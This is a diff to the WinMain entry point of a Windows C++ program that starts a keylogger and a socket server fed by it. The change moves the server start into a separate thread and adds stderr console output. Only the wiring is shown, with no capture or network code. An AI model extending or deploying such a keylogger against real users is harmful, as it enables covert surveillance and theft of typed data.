@@ -9,9 +9,10 @@
 #include <tchar.h>
 #include <stdio.h>
 #include <cstdlib>
-#include <memory>
+#include <memory>		
 #include <io.h>
 #include <fcntl.h>
+#include <thread>
 
 #include "Keylogger.h"
 #include "SocketServer.h"
@@ -23,6 +24,7 @@ shared_ptr<SocketServer> socketServer;
 
 LRESULT CALLBACK WndProc(HWND hWnd, UINT message,
 	WPARAM wParam, LPARAM lParam);
+void socketThreadProc();
 
 INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 	LPSTR lpCmdLine, INT iCmdShow) {
@@ -30,6 +32,7 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 	// Add console for debug
 	AllocConsole();
 	freopen("CONOUT$", "w", stdout);
+	freopen("CONOUT$", "w", stderr);
 
 	MSG msg;
 	WNDCLASS wndClass;
@@ -47,11 +50,12 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 	logger->start();
 
 	socketServer = make_shared<SocketServer>(logger.get());
-	socketServer->start();
+	std::thread socketThread(socketThreadProc);
 	while (GetMessage(&msg, NULL, 0, 0)) {
 		DispatchMessage(&msg);
 	}
 
+	socketThread.join();
 	return msg.wParam;
 }
 
@@ -70,3 +74,6 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT message,
 	}
 }
 
+void socketThreadProc() {
+	socketServer->start();
+}
